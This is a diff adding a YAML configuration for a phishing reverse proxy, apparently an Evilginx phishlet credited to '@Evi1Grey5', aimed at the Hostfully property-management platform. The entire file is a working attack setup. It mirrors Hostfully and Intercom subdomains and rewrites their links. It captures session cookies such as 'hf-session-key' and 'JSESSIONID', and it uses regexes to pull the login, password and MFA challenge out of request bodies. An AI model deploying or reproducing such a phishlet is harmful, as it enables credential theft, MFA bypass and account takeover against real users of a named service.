@@ -1,0 +1,61 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+#redirect_url: 'https://platform.hostfully.com/app/#/inbox'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'hostfully.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'hostfully.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'platform', orig_sub: 'platform', domain: 'hostfully.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'widget', orig_sub: 'widget', domain: 'intercom.io', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'js', orig_sub: 'js', domain: 'intercomcdn.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'hostfully', orig_sub: 'hostfully', domain: 'postaffiliatepro.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api-iam', orig_sub: 'api-iam', domain: 'intercom.io', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'hostfully.com', orig_sub: 'hostfully', domain: 'hostfully.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['application/javascript,application/json,text/plain,text/javascript,text/javascript,image/gif,image/png,image/svg+xml']}
+  - {triggers_on: 'platform.hostfully.com', orig_sub: 'platform', domain: 'hostfully.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['application/javascript,application/json,text/plain,text/javascript,text/javascript,image/gif,image/png,image/svg+xml']}
+  - {triggers_on: 'js.intercomcdn.com', orig_sub: 'js', domain: 'intercomcdn.com', search: 'href="https://{hostname}', replace: '', mimes: ['application/javascript,application/json,text/plain,text/javascript,text/javascript,image/gif,image/png,image/svg+xml']}
+  - {triggers_on: 'hostfully.postaffiliatepro.com', orig_sub: 'hostfully', domain: 'postaffiliatepro.com', search: 'href="https://{hostname}', replace: '', mimes: ['application/javascript,application/json,text/plain,text/javascript,text/javascript,image/gif,image/png,image/svg+xml']}
+
+auth_tokens:
+  - domain: 'platform.hostfully.com'
+    keys: ['_gcl_au', '_ga_2P6Q8PGG16', 'rxVisitor', 'dtCookie', 'rxvt', 'dtPC', '_fbp', 'intercom-device-id-p5dki4sl,regexp', '_ga', '_ga_XPZK03Y2JL', '52ea-57c0', 'intercom-session-p5dki4sl', '_ga_15GQDK80BL', 'hf-session-key', 'JSESSIONID', 'uvts', 'uvts', '(.*)','.*,regexp']
+  - domain: 'www.platform.hostfully.com' 
+    keys: ['_gcl_au', '_ga_2P6Q8PGG16', 'rxVisitor', 'dtCookie', 'rxvt', 'dtPC', '_fbp', 'intercom-device-id-p5dki4sl,regexp', '_ga', '_ga_XPZK03Y2JL', '52ea-57c0', 'intercom-session-p5dki4sl', '_ga_15GQDK80BL', 'hf-session-key', 'JSESSIONID', 'uvts', 'uvts', '(.*)','.*,regexp']
+  - domain: '.hostfully.com'
+    keys: ['_gcl_au', '_ga_2P6Q8PGG16', 'rxVisitor', 'dtCookie', 'rxvt', 'dtPC', '_fbp', 'intercom-device-id-p5dki4sl,regexp', '_ga', '_ga_XPZK03Y2JL', '52ea-57c0', 'intercom-session-p5dki4sl', '_ga_15GQDK80BL', 'hf-session-key', 'JSESSIONID', 'uvts', 'uvts', '(.*)','.*,regexp']
+  - domain: 'platform.hostfully.com'
+    keys: ['(.*)','.*,regexp']
+
+auth_urls:
+  - 'app/#/dashboard'
+  - '/.*'
+  - '/app/.*' 
+
+credentials:
+  username:
+    key: ''
+    search: '"login":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)' 
+    type: 'json'
+  custom:
+  - key: 'mfaChallenge'
+    search: '"mfaChallenge":"([^"]*)'
+    type: 'json'
+  - key: 'anonymous_session'
+    search: '"anonymous_session":"([^"]*)'
+    type: 'json'
+  - key: 'mfaChallenge'
+    search: '"mfaChallenge":"([^"]*)'
+    type: 'json'
+
+
+login:
+  domain: 'platform.hostfully.com'
+  path: '/app/#/login'
+  #domain: '.platform.hostfully.com'
+  #path: '/mfa-exchange'
